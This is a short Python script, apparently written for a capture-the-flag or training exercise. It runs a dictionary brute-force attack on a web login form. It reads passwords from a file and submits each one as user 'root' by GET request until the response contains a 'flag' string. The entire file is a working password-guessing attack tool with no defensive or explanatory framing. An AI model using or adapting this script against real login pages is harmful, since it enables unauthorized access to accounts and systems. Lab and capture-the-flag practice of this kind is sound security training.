#/Users/nerahmou/.brew/bin/python3

import requests
import argparse
import re

def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("url", help="The ip to request")
    parser.add_argument("path", help="The dictionnary file with a set of password")
    return parser.parse_args()

def brute_force(args):
    with open(args.path) as file:
        for passwd in file.readlines():
            passwd = passwd.strip()
            response = requests.get(args.url, params=dict(page='signin', username='root', password=passwd, Login='Login'))
            regex = re.search(r"(flag.*?)<", response.text, re.I)
            if (regex):
                return print(f'\n\tThe Password is : {passwd}\n\t\t {regex.group(1).strip()}')
            else:
                print(f'"{passwd}": Incorrect')

if __name__ == "__main__":
    args = parse_args()
    brute_force(args)
